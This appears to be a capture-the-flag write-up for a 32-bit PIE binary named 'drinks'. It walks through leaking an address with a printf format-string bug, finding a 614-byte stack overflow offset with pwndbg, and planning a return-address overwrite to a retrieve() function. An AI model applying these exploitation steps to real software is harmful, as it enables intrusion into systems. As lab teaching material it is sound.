# Solution

## Analysis

1. The program notably has PIE enabled, so we need to find a way to leak out the function addresses.
   ```bash
    # checksec drinks 
    [*]
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        PIE enabled
        Stripped:   No
    ```

    If you want the assembly code, type in this command:
    ```bash
    objdump -d -M intel --source drinks > objdump.txt
    ```

2. `printf(drink)` can be used to leak out the address.
   ```c
    gets(drink);
    printf(drink);
    ```

    We can use it to leak stack values (x86 program) such as the `vuln()` address.

3. The found offset is `614`.
   ```bash
   pwndbg> file drinks
   pwndbg> cyclic 1000
   aaaabaaacaaadaaaeaaafaaagaa...
   pwndbg> r
   What kind of drink do you want? a
   a
   
   What about the flavour?         aaaabaaacaaadaaaeaaafaaagaa...
   Your drink will be prepared in a moment!
   Program received signal SIGSEGV, Segmentation fault.

   0x61656761 in ?? ()
   LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
   ────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────
    EAX  0
    EBX  0x61636761 ('agca')
    ECX  0
    EDX  0
    EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
    ESI  0xffffcfac ◂— 'aikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj'
    EBP  0x61646761 ('agda')
    ESP  0xffffced0 ◂— 0x61666761 ('agfa')
    EIP  0x61656761 ('agea')
   ──────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────
   Invalid address 0x61656761

   pwndbg> cyclic -l 0x61656761
   Finding cyclic pattern of 4 bytes: b'agea' (hex: 0x61676561)
   Found at offset 614
   ```

## Leaking Address

1. Using [**pwndbg**](https://github.com/pwndbg/pwndbg), disable ASLR when running the program.
   ```bash
   pwndbg> aslr off
   ASLR is OFF (show disable-randomization)
   pwndbg> r

   Ctrl + C
   
   pwndbg> inf fu vuln
   0x56556287  vuln
   pwndbg> inf fu retrieve
   0x565561ed  retrieve
   ```

2. Leak an address.
   ```bash
   pwndbg> aslr off
   ASLR is OFF (show disable-randomization)
   pwndbg> r
   What kind of drink do you want? %p %p %p
   (nil) (nil) 0x56556296
   ```

3. Calculate offset from leak and `vuln()` address.
   ```
   0x56556296 - 0x56556287 = 0xf
   ```

4. Calculate offset from `vuln()` address and `retrieve()` address.
   ```
   0x56556287 - 0x565561ed = 0x9a
   ```

## Payload Creation

The first payload should be used to leak out the address.
```
%p %p %p
```

The second payload should follow this structure:

- 614 `b'A'`'s
- `*retrieve()`

## Exploiting

Have a look at the [`soln.py`](./soln.py) to see the full script and how it was created.